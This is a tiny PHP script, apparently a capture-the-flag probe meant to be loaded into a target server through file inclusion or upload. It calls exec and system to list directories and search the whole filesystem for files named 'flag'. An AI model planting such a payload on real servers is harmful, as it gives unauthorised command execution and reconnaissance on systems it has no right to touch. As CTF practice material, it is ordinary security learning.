<?php
echo "load outside phpfile";
echo "helll";

exec('ls 2>&1', $output, $return_val); 
print_r($output);

system("ls -lha");

system("find / -name *flag*");
?>
